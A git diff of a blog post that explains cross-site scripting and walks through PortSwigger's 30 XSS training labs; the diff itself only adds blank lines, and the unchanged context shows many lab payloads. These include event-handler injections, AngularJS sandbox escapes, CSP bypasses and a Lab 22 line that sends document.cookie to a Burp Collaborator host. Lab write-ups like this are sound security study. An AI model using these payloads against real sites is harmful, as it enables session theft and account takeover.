@@ -9,9 +9,11 @@ description: An intro to Cross Site Scripting and walkthrough of all 30 portswig
 This week, I solved all 30 labs on Portswigger to learn about this vulnerability. Below is a brief description of this vulnerability and after that there is a detailed walkthrough for each of the labs. A huge shoutout to [TCE on Youtube](https://www.youtube.com/@TheCyberExpert), as I wouldn't have been able to finish most of these without help from his walkthrough livestreams. Do check out his channel.
 
 ## Everything about XSS
+
 ##### 1. What is Cross-Site Scripting (XSS)?
 
 XSS is a web vulnerability that lets attackers inject malicious JavaScript into websites, affecting users who visit them. It breaks the browser’s same-origin policy, allowing attackers to access or manipulate sensitive data, impersonate users, or perform actions on their behalf.
+
 ##### 2. Types of XSS
 
 - Reflected XSS:  
@@ -23,12 +25,14 @@ XSS is a web vulnerability that lets attackers inject malicious JavaScript into 
 - DOM-based XSS:  
     Vulnerability is in client-side JavaScript.  
     Malicious input flows from a source (like `location.search`) to a dangerous sink (like `innerHTML` or `eval()`).
+
 ##### 3. Common Sources & Sinks
 
 - Sources (attacker-controlled input):  
     `location.search`, `document.referrer`, `document.cookie`, `location.hash`
 - Sinks (can be remembered as destinations) (where input gets injected dangerously):  
     `innerHTML`, `outerHTML`, `document.write()`, `eval()`, `setTimeout()`, jQuery DOM functions (`html()`, `append()`, `attr()`)    
+
 ##### 4. XSS Contexts (Where Injection Lands)
 
 - HTML Context:  
@@ -43,6 +47,7 @@ XSS is a web vulnerability that lets attackers inject malicious JavaScript into 
     Inside backtick-quoted JS — e.g., `` `Hello ${INPUT}` ``
 - CSP-Restricted Context:  
     Environment has a Content Security Policy; payloads need to bypass script restrictions (e.g., using image requests or sandbox escapes)    
+
 ##### 5. Impact of XSS
 
 - Steal cookies, session tokens, or credentials    
@@ -50,19 +55,23 @@ XSS is a web vulnerability that lets attackers inject malicious JavaScript into 
 - Modify site content (defacement)    
 - Bypass CSRF protections by stealing tokens
 - Perform actions as the victim (e.g., fund transfers, message sending)
+
 ##### 6. Mitigations
 
 - Input Validation: Filter user input strictly based on expected format
 - Output Encoding: Encode data before rendering it in HTML, JS, or attributes
 - CSP: Use Content Security Policy to limit script execution    
 - Secure Frameworks: Use libraries with built-in protections (e.g., React auto-escapes output)
+
 ##### 7. Common Bypasses
 
 - Use tags like `<img>` or `<svg>` with `onerror`/`onload` handlers
 - Break out of attributes or JS strings using quotes or special chars
 - Encode payloads (e.g., `&lt;script&gt;`) to sneak past filters
 - Use framework-specific tricks (e.g., Angular sandbox escapes, CSP policy injection)
+
 ## Labs
+
 ### 1. Reflected XSS into HTML context with nothing encoded
 
 Payload that worked: 
@@ -76,6 +85,7 @@ Explanation:
 This is a reflected XSS where unsanitized input is injected into the HTML and executed by the browser. The script runs only when a victim clicks a crafted URL, making it a one-time, user-triggered attack.
 
 ![](/assets/images/XSS/Pasted%20image%2020250723132322.png)
+
 ### 2. Stored XSS into HTML context with nothing encoded
 
 Payload that worked: 
@@ -89,6 +99,7 @@ Explanation:
 This lab has a stored XSS vulnerability, where the payload is saved on the server (in this case in a comment) and executed whenever the page is viewed. Since the input isn’t sanitized or encoded, the browser runs the script automatically. Unlike reflected XSS, this affects every user who loads the page.
 
 ![](/assets/images/XSS/Pasted%20image%2020250723132917.png)
+
 ### 3. DOM XSS in `innerHTML` sink using source `location.search`
 
 Payload that worked: 
@@ -118,6 +129,7 @@ Official walkthrough solution:
 ```
 
 Basically, closing the IMG tag is important.
+
 ### 4. DOM XSS in `innerHTML` sink using source `location.search`
 
 Payloads that worked: 
@@ -149,6 +161,7 @@ As seen, it does get embedded in the page but it doesn't run. But why? This is b
 Both Lab 3 and 4 are based on DOM based XSS but the script tags don't work in Lab 4 because `document.write()` injects HTML into the live parser stream, so `<script>` tags are executed like normal page content. `innerHTML` modifies the DOM directly, skipping the parser, so script tags are inserted but never run.  That’s why `innerHTML` needs tricks like `onerror` or `onload` to trigger JavaScript.
 
 For further reference I found this post which helped me - https://security.stackexchange.com/questions/60861/why-are-scripts-injected-through-innerhtml-not-executed-whilst-onerror-and-other
+
 ### 5. DOM XSS in jQuery anchor `href` attribute sink using `location.search` source
 
 Payload that worked
@@ -178,6 +191,7 @@ https://LABID.web-security-academy.net/feedback?returnPath=http://www.google.com
 Clicking on back will redirect to Google. Now just put in the javascript alert payload and click back to solve the lab.
 
 NOTE that this is a problem with the old version of jQuery. Check out - CVE-2011-4969 https://github.com/advisories/GHSA-579v-mp3v-rrw5 
+
 ### 6. DOM XSS in jQuery selector sink using a hashchange event
 
 Payload that worked:
@@ -243,6 +257,7 @@ a" onfocus="alert(1)" autofocus
 ```
 
 However, for this, I needed to click on the input element for it to work, seems like autofocus must be put in first.
+
 ### 8. Stored XSS into anchor `href` attribute with double quotes HTML-encoded
 
 Payload that worked:
@@ -262,6 +277,7 @@ Looking at the source code using inspect element, we can see that the website I 
 ![](/assets/images/XSS/Pasted%20image%2020250725001455.png)
 
 We had exploited a similar condition in Lab 5 where there was href. Using the same payload `javascript:alert(1)` works. Clicking on the name after injecting this payload will trigger the XSS alert.
+
 ### 9. Reflected XSS into a JavaScript string with angle brackets HTML encoded
 
 Payload that worked:
@@ -315,6 +331,7 @@ As we can see, the string is inside the option tags.
 ![](/assets/images/XSS/Pasted%20image%2020250725011843.png)
 
 Since there is no encoding, a simple `<script>alert(1)</script>` does the job.
+
 ### 11. DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
 
 Payload that worked:
@@ -330,6 +347,7 @@ This site does use angularJS. It considers anything inside {{}} - double curly b
 ![](/assets/images/XSS/Pasted%20image%2020250725013136.png)
 
 Referring to this cheatsheet https://portswigger.net/web-security/cross-site-scripting/cheat-sheet we can find a simple payload for AngularJS XSS. Other payloads may also work.
+
 ### 12. Reflected DOM XSS
 
 Payload that worked:
@@ -365,6 +383,7 @@ We need to bypass the json format and get it to execute the XSS. Playing around 
 Explanation : 
 1. We first use backslash to escape the double quote and then use the curly bracket and semi-colon to complete the json structure.
 2. We then simply put the XSS payload and comment out the rest of the remaining json.
+
 ### 13. Stored DOM XSS
 
 Payload that worked:
@@ -396,6 +415,7 @@ Now the script tags should work in theory, but it doesn't work so we can try usi
 ```
 <> <img src=x onerror=alert(1)> <>
 ```
+
 ### 14. Reflected XSS into HTML context with most tags and attributes blocked
 
 Payload that worked:
@@ -412,6 +432,7 @@ Well, this is a simple but longer lab. I don't have burp pro at the time of writ
 2. Copied a list of tags to the intruders and fuzzed for a valid tag. `body` tag worked.
 3. Again used intruder and a list of attributes to see what works. Found on `onresize` to be working.
 4. Used `body` tag with `onresize` to craft a payload, used `onload` attribute to forcibly resize the page to trigger the payload.
+
 ### 15. Reflected XSS into HTML context with all tags blocked except custom ones
 
 Payload that worked:
@@ -437,6 +458,7 @@ Therefore in order to exploit it, we can use script tags and assign the maliciou
 location='https://LABID.web-security-academy.net/?search=%3Chello+id%3Dx+onfocus%3Dalert%281%29+tabindex%3D0%3Ehello%3C%2Fhello%3E#x';
 </script>
 ```
+
 ### 16. Reflected XSS with some SVG markup allowed
 
 Payload that worked:
@@ -450,6 +472,7 @@ Methodology and explanation:
 We can refer to the XSS cheatsheet and try a bunch of SVG payloads. I tried it manually as the intruder will still be slow on burp suite community edition.
 
 Other payloads may work as well, this is the first one that gave me a result.
+
 ### 17. Reflected XSS in canonical link tag
 
 Payload that worked:
@@ -489,6 +512,7 @@ https://LABID.web-security-academy.net/?hello=1%27accesskey=%27x%27onclick=%27al
 ```
 
 This particular lab was strange and I am not sure I understand it completely.
+
 ### 18. Reflected XSS into a JavaScript string with single quote and backslash escaped
 
 Payload that worked:
@@ -516,6 +540,7 @@ As we can see, the single quote is escaped. However angled brackets aren't encod
 ![](/assets/images/XSS/Pasted%20image%2020250726113742.png)
 
 As we can see, it did the trick. This should trigger our payload.
+
 ### 19. Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
 
 Payload that worked:
@@ -543,6 +568,7 @@ As we can see hello, it outside the quote.
 ![](/assets/images/XSS/Pasted%20image%2020250726120903.png)
 
 Now we can just put the XSS payload in place of hello and comment out the rest of the line. 
+
 ### 20. Stored XSS into `onclick` event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped
 
 Payload that worked:
@@ -578,6 +604,7 @@ Removing that ) and escaping the extra ' at the end with a &#x27; should solve t
 This is a particularly weird concept to get your head around. I don't know javascript so it is hard for me as well, however take a look at the screenshot below from the explanation I got from GPT, this cleared a lot of things for me and should help. We can see both, the failed payload as well as the working one. The difference in the colour should resolve any doubt.
 
 ![](/assets/images/XSS/Pasted%20image%2020250726200908.png)
+
 ### 21. Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped
 
 Payload that worked:
@@ -593,6 +620,7 @@ We start as usual by putting in a random string in search box. We can see that t
 ![](/assets/images/XSS/Pasted%20image%2020250726201718.png)
 
 Upon looking up their significance, I saw that they can have 1. Multiline strings and 2. display a variable inside the string using ${variable name}. This is similar to f strings in python. We can just put the payload in the ${} and it should execute. 
+
 ### 22. Exploiting cross-site scripting to steal cookies
 
 Payload that worked:
@@ -618,6 +646,7 @@ The `document.cookie` must be outside the URL quotes to work. The following payl
 ```
 <script>fetch('https://BURPID.oastify.com/?cookie=' + document.cookie);</script>
 ```
+
 ### 23. Exploiting cross-site scripting to capture passwords
 
 Payload that worked:
@@ -637,6 +666,7 @@ This is one of the most interesting scenarios. I had to refer to the solution. A
 ![](/assets/images/XSS/Pasted%20image%2020250727000347.png)
 
 Simply use the credentials to login.
+
 ### 24. Exploiting XSS to bypass CSRF defenses 
 
 Payload that worked:
@@ -648,6 +678,7 @@ Payload that worked:
 Methodology and explanation:
 
 We did a CSRF here using XSS. We used a stored XSS in the comments section to steal the CSRF token of another user. CSRF is a basically when the browser performs unauthorized/unwanted actions, in this case stealing the CSRF token. I had to use the solution myself as this is the first time I am doing a CSRF attack and I don't know javascript as of now. 
+
 ### 25. Reflected XSS with AngularJS sandbox escape without strings
 
 Payload that worked:
@@ -679,6 +710,7 @@ a. Breaking the sandbox - `toString().constructor.prototype.charAt = [].join;`
 Overwrites the `charAt` function used by AngularJS for security checks, disabling the sandbox.
 b. Executing the payload - `[1,2] | orderBy: toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)`
 Passes a string (built without quotes) - `"x=alert(1)"`, to the `orderBy` filter, which gets executed now that the sandbox is broken.
+
 ### 26. Reflected XSS with AngularJS sandbox escape and CSP
 
 Payload that worked:
@@ -711,6 +743,7 @@ Understanding the payload:
 
 Content Security Policy is a browser feature for restricting how code runs on browser. 
 This payload uses the `ng-focus` directive to execute when the input field is focused, passing `$event.composedPath()` to the `orderBy` filter. The filter argument `'(z=alert)(document.cookie)'` is parsed by Angular as an expression that assigns `alert` to `z` and then immediately calls `z(document.cookie)`, effectively executing `alert(document.cookie)`. Since this code runs entirely within Angular's expression context and avoids inline scripts, `eval`, or quoted strings, it successfully bypasses standard Content Security Policy (CSP) restrictions.
+
 ### 27. Reflected XSS with event handlers and `href` attributes blocked
 
 Payload that worked:
@@ -776,6 +809,7 @@ Now that we know what the animate tag does, we can use it to execute our XSS pay
 ```
 
 This payload executes the XSS.
+
 ### 28. Reflected XSS in a JavaScript URL with some characters blocked
 
 Payload that worked:
@@ -855,6 +889,7 @@ Forces the browser to evaluate `window` as a string, which in turn triggers `toS
 Ends the `'}` to make sure the javascript is not broken. This is added to make sure we don't get any syntax errors.
 
 When `window + ''` runs, the `toString()` function is triggered, which we had overwritten as function `x`, which throws an error and calls `alert()`.
+
 ### 29. Reflected XSS protected by very strict CSP, with dangling markup attack
 
 Payloads that worked:
@@ -938,6 +973,7 @@ We just need to replace the CSRF token and the value of the email field and send
 </html>
 
 ```
+
 ### 30. Reflected XSS protected by CSP, with CSP bypass
 
 Payloads that worked:
